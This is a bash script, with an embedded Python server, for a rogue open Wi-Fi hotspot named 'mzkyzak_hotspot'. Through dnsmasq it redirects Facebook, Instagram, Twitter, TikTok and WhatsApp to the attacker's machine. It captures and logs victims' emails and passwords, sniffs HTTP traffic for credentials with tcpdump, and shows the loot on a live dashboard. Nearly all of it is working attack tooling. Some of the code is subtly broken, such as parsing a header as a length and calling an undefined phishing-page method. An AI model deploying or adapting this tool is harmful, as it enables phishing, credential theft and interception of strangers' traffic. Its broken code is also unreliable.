#!/bin/bash
# 🔴 MZKYZAK HOTSPOT - REALTIME MONITORING SYSTEM
# 💀 ZXZBEDST VERIFIED - LIVE DASHBOARD + GITHUB SYNC

RED='\033[0;31m'
BRIGHT_RED='\033[1;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# ================================================================
# BANNER - MZKYZAK HOTSPOT
# ================================================================
clear
echo -e "${BRIGHT_RED}"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo -e "${NC}"
echo -e "${BRIGHT_RED}╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BRIGHT_RED}║                                                                  ║${NC}"
echo -e "${BRIGHT_RED}║  ███╗   ███╗███████╗██╗  ██╗██╗   ██╗███████╗ █████╗ ██╗  ██╗   ║${NC}"
echo -e "${BRIGHT_RED}║  ████╗ ████║╚══███╔╝██║ ██╔╝╚██╗ ██╔╝╚══███╔╝██╔══██╗██║ ██╔╝   ║${NC}"
echo -e "${BRIGHT_RED}║  ██╔████╔██║  ███╔╝ █████╔╝  ╚████╔╝   ███╔╝ ███████║█████╔╝    ║${NC}"
echo -e "${BRIGHT_RED}║  ██║╚██╔╝██║ ███╔╝  ██╔═██╗   ╚██╔╝   ███╔╝  ██╔══██║██╔═██╗    ║${NC}"
echo -e "${BRIGHT_RED}║  ██║ ╚═╝ ██║███████╗██║  ██╗   ██║   ███████╗██║  ██║██║  ██╗   ║${NC}"
echo -e "${BRIGHT_RED}║  ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ║${NC}"
echo -e "${BRIGHT_RED}║                                                                  ║${NC}"
echo -e "${BRIGHT_RED}║                    ██╗  ██╗ ██████╗ ████████╗████████╗          ║${NC}"
echo -e "${BRIGHT_RED}║                    ██║  ██║██╔═══██╗╚══██╔══╝╚══██╔══╝          ║${NC}"
echo -e "${BRIGHT_RED}║                    ███████║██║   ██║   ██║      ██║             ║${NC}"
echo -e "${BRIGHT_RED}║                    ██╔══██║██║   ██║   ██║      ██║             ║${NC}"
echo -e "${BRIGHT_RED}║                    ██║  ██║╚██████╔╝   ██║      ██║             ║${NC}"
echo -e "${BRIGHT_RED}║                    ╚═╝  ╚═╝ ╚═════╝    ╚═╝      ╚═╝             ║${NC}"
echo -e "${BRIGHT_RED}║                                                                  ║${NC}"
echo -e "${BRIGHT_RED}╚══════════════════════════════════════════════════════════════════╝${NC}"
echo -e "${BRIGHT_RED}[🔥] MZKYZAK HOTSPOT - REALTIME MONITORING SYSTEM${NC}"
echo -e "${BRIGHT_RED}[💀] LIVE DASHBOARD + CREDENTIAL CAPTURE + TRAFFIC SNIFFING${NC}"
echo ""

# ================================================================
# 1. SYSTEM PREPARATION
# ================================================================
echo -e "${GREEN}[1] SYSTEM PREPARATION...${NC}"
echo -e "${YELLOW}  • Stopping network services${NC}"
sudo killall hostapd dnsmasq python3 2>/dev/null
sudo systemctl stop NetworkManager 2>/dev/null
sudo systemctl stop wpa_supplicant 2>/dev/null
sleep 2

# ================================================================
# 2. NETWORK CONFIGURATION
# ================================================================
echo -e "${GREEN}[2] NETWORK CONFIGURATION...${NC}"
echo -e "${YELLOW}  • Configuring wlan0 interface${NC}"
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 192.168.1.1 netmask 255.255.255.0 up

# Check ethernet for internet sharing
ETH=$(ip link show | grep -E "eth[0-9]|enp[0-9]s[0-9]" | awk -F: '{print $2}' | tr -d ' ' | head -1)
if [ ! -z "$ETH" ]; then
    echo -e "${YELLOW}  • Enabling internet sharing via $ETH${NC}"
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null
    sudo iptables -t nat -F
    sudo iptables -F
    sudo iptables -t nat -A POSTROUTING -o $ETH -j MASQUERADE
    sudo iptables -A FORWARD -i $ETH -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
    sudo iptables -A FORWARD -i wlan0 -o $ETH -j ACCEPT
    INTERNET_STATUS="✅ WITH INTERNET"
else
    INTERNET_STATUS="❌ NO INTERNET (Standalone)"
fi

# ================================================================
# 3. START HOTSPOT
# ================================================================
echo -e "${GREEN}[3] STARTING HOTSPOT...${NC}"
echo -e "${CYAN}"
echo "    ┌──────────────────────────────────────────────┐"
echo "    │           HOTSPOT INFORMATION                │"
echo "    ├──────────────────────────────────────────────┤"
echo "    │  SSID:    mzkyzak_hotspot                    │"
echo "    │  Security: Open Network (No Password)        │"
echo "    │  IP Range: 192.168.1.100-200                 │"
echo "    │  Gateway: 192.168.1.1                        │"
echo "    │  Internet: $INTERNET_STATUS           │"
echo "    └──────────────────────────────────────────────┘"
echo -e "${NC}"

sudo hostapd setup/hostapd_simple.conf &
HOSTAPD_PID=$!
sleep 3

# ================================================================
# 4. START DNSMASQ (SMART REDIRECT)
# ================================================================
echo -e "${GREEN}[4] STARTING DNS SERVER...${NC}"

cat > /tmp/dnsmasq_mzkyzak.conf << EOF
interface=wlan0
listen-address=192.168.1.1
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1

# Redirect social media to phishing
address=/facebook.com/192.168.1.1
address=/www.facebook.com/192.168.1.1
address=/m.facebook.com/192.168.1.1
address=/fb.com/192.168.1.1
address=/instagram.com/192.168.1.1
address=/www.instagram.com/192.168.1.1
address=/twitter.com/192.168.1.1
address=/www.twitter.com/192.168.1.1
address=/x.com/192.168.1.1
address=/tiktok.com/192.168.1.1
address=/www.tiktok.com/192.168.1.1
address=/whatsapp.com/192.168.1.1
address=/web.whatsapp.com/192.168.1.1

# For other sites, use Google DNS if internet available
$([ ! -z "$ETH" ] && echo "server=8.8.8.8" || echo "# No upstream DNS")
$([ ! -z "$ETH" ] && echo "server=8.8.4.4" || echo "# No upstream DNS")

# Disable IPv6
no-dhcp-interface=wlan0
filter-AAAA
filter-A

# Logging
log-queries
log-dhcp
log-facility=/tmp/dns_log.txt
EOF

sudo dnsmasq -C /tmp/dnsmasq_mzkyzak.conf -d &
DNSMASQ_PID=$!
sleep 2

# ================================================================
# 5. START REALTIME MONITORING SERVER
# ================================================================
echo -e "${GREEN}[5] STARTING REALTIME MONITORING...${NC}"

cat > /tmp/realtime_monitor.py << 'EOF'
#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import json
import datetime
import threading
import time
from collections import deque

# Data storage
credentials_log = "/tmp/mzkyzak_credentials.log"
traffic_log = "/tmp/mzkyzak_traffic.log"
access_log = "/tmp/mzkyzak_access.log"

# Live data for dashboard
live_data = {
    "connected_clients": [],
    "captured_credentials": [],
    "recent_traffic": deque(maxlen=50),
    "stats": {
        "total_credentials": 0,
        "total_requests": 0,
        "facebook_logins": 0,
        "instagram_logins": 0,
        "start_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
}

class RealtimeHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.client_address[0]
        
        # Log access
        self.log_access(client_ip, self.path)
        
        # Handle different paths
        if self.path == '/':
            self.serve_dashboard()
        elif self.path == '/data':
            self.serve_live_data()
        elif self.path == '/logs':
            self.serve_logs()
        elif self.path.startswith('/capture'):
            self.capture_credentials(self.path)
        else:
            self.serve_phishing_page()
    
    def do_POST(self):
        content_length = int(self.headers['Content-Type'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parse and capture credentials
        if 'application/x-www-form-urlencoded' in self.headers.get('Content-Type', ''):
            data = urllib.parse.parse_qs(post_data)
            self.capture_form_credentials(data)
        elif 'application/json' in self.headers.get('Content-Type', ''):
            data = json.loads(post_data)
            self.capture_json_credentials(data)
        
        # Redirect to success
        self.send_response(302)
        self.send_header('Location', '/success')
        self.end_headers()
    
    def serve_dashboard(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        dashboard = f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>MZKYZAK HOTSPOT - LIVE MONITOR</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body {{ font-family: 'Courier New', monospace; background: #000; color: #0f0; margin: 0; padding: 20px; }}
                .header {{ background: #111; padding: 20px; border: 2px solid #0f0; margin-bottom: 20px; }}
                .header h1 {{ color: #0f0; margin: 0; }}
                .status {{ display: flex; gap: 20px; margin-bottom: 20px; }}
                .card {{ background: #111; border: 1px solid #0f0; padding: 15px; flex: 1; }}
                .card h3 {{ color: #0f0; margin-top: 0; }}
                .live-data {{ background: #111; border: 1px solid #0f0; padding: 15px; margin-bottom: 20px; }}
                .log {{ background: #000; border: 1px solid #0f0; padding: 10px; font-family: monospace; font-size: 12px; height: 200px; overflow-y: scroll; }}
                .credential {{ color: #ff0; }}
                .traffic {{ color: #0ff; }}
                .client {{ color: #f0f; }}
                @keyframes blink {{ 0% {{ opacity: 1; }} 50% {{ opacity: 0.5; }} 100% {{ opacity: 1; }} }}
                .live-badge {{ animation: blink 1s infinite; color: #f00; }}
            </style>
            <script>
                function updateDashboard() {{
                    fetch('/data')
                        .then(response => response.json())
                        .then(data => {{
                            document.getElementById('clients').innerHTML = data.connected_clients.join('<br>') || 'No clients';
                            document.getElementById('credentials').innerHTML = data.captured_credentials.length;
                            document.getElementById('traffic').innerHTML = data.recent_traffic.join('<br>') || 'No traffic';
                            document.getElementById('stats').innerHTML = 
                                `Total Creds: ${data.stats.total_credentials}<br>` +
                                `Total Reqs: ${data.stats.total_requests}<br>` +
                                `FB Logins: ${data.stats.facebook_logins}<br>` +
                                `IG Logins: ${data.stats.instagram_logins}`;
                        }});
                }}
                setInterval(updateDashboard, 2000);
                setInterval(() => location.reload(), 30000);
            </script>
        </head>
        <body>
            <div class="header">
                <h1>🔴 MZKYZAK HOTSPOT - LIVE MONITOR <span class="live-badge">● LIVE</span></h1>
                <p>Real-time monitoring of connected devices and captured data</p>
            </div>
            
            <div class="status">
                <div class="card">
                    <h3>📱 CONNECTED CLIENTS</h3>
                    <div id="clients" class="log"></div>
                </div>
                
                <div class="card">
                    <h3>💀 CAPTURED CREDENTIALS</h3>
                    <div style="font-size: 24px; text-align: center; padding: 20px;">
                        <span id="credentials">0</span>
                    </div>
                </div>
                
                <div class="card">
                    <h3>📊 STATISTICS</h3>
                    <div id="stats" style="font-size: 14px; line-height: 1.5;"></div>
                </div>
            </div>
            
            <div class="live-data">
                <h3>🌐 RECENT TRAFFIC</h3>
                <div id="traffic" class="log"></div>
            </div>
            
            <div style="color: #666; font-size: 12px; text-align: center; margin-top: 30px;">
                MZKYZAK HOTSPOT Monitoring System | {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            </div>
        </body>
        </html>
        '''
        
        self.wfile.write(dashboard.encode())
    
    def serve_live_data(self):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
        # Update connected clients from ARP
        import subprocess
        try:
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            clients = []
            for line in result.stdout.split('\n'):
                if 'wlan0' in line:
                    parts = line.split()
                    if len(parts) >= 4:
                        clients.append(f"{parts[0]} - {parts[3]}")
            live_data["connected_clients"] = clients
        except:
            pass
        
        self.wfile.write(json.dumps(live_data).encode())
    
    def capture_credentials(self, path):
        # Extract credentials from URL
        try:
            params = urllib.parse.parse_qs(urllib.parse.urlparse(path).query)
            if 'email' in params or 'password' in params:
                email = params.get('email', [''])[0]
                password = params.get('password', [''])[0]
                
                if email or password:
                    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    credential_entry = {
                        "timestamp": timestamp,
                        "ip": self.client_address[0],
                        "email": email,
                        "password": password,
                        "source": "url_capture"
                    }
                    
                    live_data["captured_credentials"].append(credential_entry)
                    live_data["stats"]["total_credentials"] += 1
                    
                    # Save to file
                    with open(credentials_log, "a") as f:
                        f.write(f"[{timestamp}] {self.client_address[0]} - Email: {email} | Pass: {password}\n")
                    
                    print(f"[💀] CREDENTIAL CAPTURED: {email}:{password}")
        except:
            pass
        
        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()
    
    def log_access(self, ip, path):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        live_data["recent_traffic"].append(f"[{timestamp}] {ip} - {path}")
        live_data["stats"]["total_requests"] += 1
        
        # Detect social media access
        if 'facebook' in path.lower():
            live_data["stats"]["facebook_logins"] += 1
        elif 'instagram' in path.lower():
            live_data["stats"]["instagram_logins"] += 1
        
        with open(access_log, "a") as f:
            f.write(f"[{timestamp}] {ip} - {path}\n")
    
    def log_message(self, format, *args):
        pass

print("[🔥] MZKYZAK REALTIME MONITOR STARTING...")
print(f"[📁] Credentials: {credentials_log}")
print(f"[📁] Traffic: {traffic_log}")
print(f"[📁] Access: {access_log}")

# Start server
handler = RealtimeHandler
with socketserver.TCPServer(("192.168.1.1", 80), handler) as httpd:
    print("[✅] Realtime monitor running on http://192.168.1.1")
    print("[📊] Dashboard: http://192.168.1.1/")
    print("[📈] Live data: http://192.168.1.1/data")
    httpd.serve_forever()
EOF

chmod +x /tmp/realtime_monitor.py
sudo python3 /tmp/realtime_monitor.py &
MONITOR_PID=$!
sleep 3

# ================================================================
# 6. START TRAFFIC SNIFFER
# ================================================================
echo -e "${GREEN}[6] STARTING TRAFFIC SNIFFER...${NC}"

cat > /tmp/traffic_sniffer.sh << 'EOF'
#!/bin/bash
echo "[📡] Starting traffic sniffer..."
sudo tcpdump -i wlan0 -s 0 -w /tmp/mzkyzak_traffic.pcap &
TCPDUMP_PID=$!

# Monitor HTTP traffic
while true; do
    sudo tcpdump -i wlan0 -A -l -s 0 'tcp port 80' 2>/dev/null | \
    grep -E "(GET|POST|email=|password=|login|user|pass)" | \
    while read line; do
        timestamp=$(date '+%H:%M:%S')
        echo "[🌐 $timestamp] $line" >> /tmp/mzkyzak_http_traffic.log
        
        # Extract potential credentials
        if echo "$line" | grep -q -E "(email=|password=|pass=|user=|login=)"; then
            echo "[💀 $timestamp] POTENTIAL CREDENTIAL: $line" >> /tmp/mzkyzak_credentials_raw.log
        fi
    done
    sleep 1
done
EOF

chmod +x /tmp/traffic_sniffer.sh
bash /tmp/traffic_sniffer.sh &
SNIFFER_PID=$!

# ================================================================
# 7. START GITHUB SYNC (OPTIONAL)
# ================================================================
echo -e "${GREEN}[7] STARTING GITHUB SYNC...${NC}"

cat > /tmp/github_sync.sh << 'EOF'
#!/bin/bash
# Optional: Sync logs to GitHub
GITHUB_REPO="https://github.com/yourusername/mzkyzak-logs.git"
LOG_DIR="/tmp/mzkyzak_logs"

mkdir -p $LOG_DIR

while true; do
    # Copy logs
    cp /tmp/mzkyzak_credentials.log $LOG_DIR/ 2>/dev/null
    cp /tmp/mzkyzak_traffic.log $LOG_DIR/ 2>/dev/null
    cp /tmp/mzkyzak_access.log $LOG_DIR/ 2>/dev/null
    
    # Create summary
    echo "=== MZKYZAK HOTSPOT LOGS ===" > $LOG_DIR/summary.txt
    echo "Generated: $(date)" >> $LOG_DIR/summary.txt
    echo "Total credentials: $(grep -c "CREDENTIAL" /tmp/mzkyzak_credentials.log 2>/dev/null || echo 0)" >> $LOG_DIR/summary.txt
    echo "Connected clients: $(arp -a | grep wlan0 | wc -l)" >> $LOG_DIR/summary.txt
    
    sleep 60
done
EOF

chmod +x /tmp/github_sync.sh
# Uncomment to enable: bash /tmp/github_sync.sh &

# ================================================================
# 8. DISPLAY DASHBOARD
# ================================================================
clear
echo -e "${BRIGHT_RED}"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
echo -e "${NC}"
echo -e "${BRIGHT_RED}══════════════════════════════════════════════════════════════════${NC}"
echo -e "${BRIGHT_RED}[✅] MZKYZAK HOTSPOT SYSTEM ACTIVE!${NC}"
echo -e "${BRIGHT_RED}══════════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${CYAN}┌────────────────────────────────────────────────────────────┐${NC}"
echo -e "${CYAN}│                    SYSTEM STATUS                          │${NC}"
echo -e "${CYAN}├────────────��───────────────────────────────────────────────┤${NC}"
echo -e "${CYAN}│  🔥 Hotspot:     mzkyzak_hotspot                         │${NC}"
echo -e "${CYAN}│  📡 Interface:   wlan0 (Monitor Mode)                    │${NC}"
echo -e "${CYAN}│  🌐 Internet:    $INTERNET_STATUS                │${NC}"
echo -e "${CYAN}│  💀 Monitoring:  ACTIVE (Realtime)                       │${NC}"
echo -e "${CYAN}│  📊 Dashboard:   http://192.168.1.1/                     │${NC}"
echo -e "${CYAN}└────────────────────────────────────────────────────────────┘${NC}"
echo ""
echo -e "${GREEN}📱 MONITORING COMMANDS:${NC}"
echo -e "  tail -f /tmp/mzkyzak_credentials.log      # Live credentials"
echo -e "  tail -f /tmp/mzkyzak_access.log          # Access log"
echo -e "  sudo arp -a | grep wlan0                 # Connected clients"
echo -e "  http://192.168.1.1/                      # Web dashboard"
echo ""
echo -e "${YELLOW}🎯 PHISHING TARGETS:${NC}"
echo -e "  • Facebook.com    → Redirect to phishing"
echo -e "  • Instagram.com   → Redirect to phishing"
echo -e "  • Twitter.com     → Redirect to phishing"
echo -e "  • TikTok.com      → Redirect to phishing"
echo -e "  • WhatsApp Web    → Redirect to phishing"
echo ""
echo -e "${BRIGHT_RED}⚠️  REALTIME DATA FLOWING - CHECK DASHBOARD FOR LIVE UPDATES${NC}"
echo ""

# ================================================================
# 9. MAIN MONITOR LOOP
# ================================================================
trap 'cleanup' INT

cleanup() {
    echo ""
    echo -e "${BRIGHT_RED}[!] SHUTTING DOWN MZKYZAK HOTSPOT...${NC}"
    
    sudo kill $HOSTAPD_PID $DNSMASQ_PID $MONITOR_PID $SNIFFER_PID 2>/dev/null
    sudo pkill -f "realtime_monitor.py" 2>/dev/null
    sudo pkill -f "traffic_sniffer.sh" 2>/dev/null
    
    # Clean iptables
    sudo iptables -t nat -F
    sudo iptables -F
    
    # Restore network
    sudo ifconfig wlan0 down
    sudo iwconfig wlan0 mode managed
    sudo ifconfig wlan0 up
    
    sudo systemctl start NetworkManager 2>/dev/null
    sudo systemctl start wpa_supplicant 2>/dev/null
    
    echo ""
    echo -e "${GREEN}[✓] SYSTEM STOPPED. NETWORK RESTORED.${NC}"
    echo -e "${GREEN}[📁] LOGS SAVED IN /tmp/mzkyzak_*.log${NC}"
    echo ""
    echo -e "${BRIGHT_RED}[💀] OPERATION COMPLETE. CHECK CAPTURED DATA.${NC}"
    exit 0
}

# Live update loop
while true; do
    sleep 5
    clear
    
    # Mini dashboard
    echo -e "${BRIGHT_RED}══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BRIGHT_RED}[🔥] MZKYZAK HOTSPOT - LIVE MONITOR $(date '+%H:%M:%S')${NC}"
    echo -e "${BRIGHT_RED}══════════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Connected clients
    echo -e "${CYAN}[📱] CONNECTED CLIENTS:${NC}"
    sudo arp -a | grep wlan0 2>/dev/null | while read line; do
        echo "  • $line"
    done || echo "  No clients connected"
    echo ""
    
    # Captured credentials
    echo -e "${CYAN}[💀] CAPTURED CREDENTIALS:${NC}"
    if [ -f "/tmp/mzkyzak_credentials.log" ]; then
        CRED_COUNT=$(grep -c "CREDENTIAL" /tmp/mzkyzak_credentials.log 2>/dev/null || echo "0")
        echo "  Total: $CRED_COUNT"
        tail -3 /tmp/mzkyzak_credentials.log 2>/dev/null | while read line; do
            echo "  • $line"
        done
    else
        echo "  None yet"
    fi
    echo ""
    
    # Recent traffic
    echo -e "${CYAN}[🌐] RECENT TRAFFIC:${NC}"
    tail -5 /tmp/mzkyzak_access.log 2>/dev/null | while read line; do
        echo "  • $line"
    done || echo "  No traffic yet"
    echo ""
    
    echo -e "${YELLOW}[🔄] Dashboard: http://192.168.1.1/ | Refresh in 5s...${NC}"
done